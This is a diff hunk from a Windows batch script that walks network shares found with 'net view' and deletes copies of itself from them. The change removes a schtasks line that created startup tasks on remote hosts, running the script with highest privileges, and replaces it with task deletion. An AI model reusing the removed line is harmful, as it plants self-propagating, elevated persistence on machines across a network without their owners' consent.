@@ -191,7 +191,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
     del /q "%%i\%%j\%~nx0"
-    for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr %%j:\%~nx0 /f /rl highest
+    for /f "delims=\" %%z in ("%%i") do schtasks /delete /s %%z /tn "%app_name% %%j" /f
   )
 )
 exit
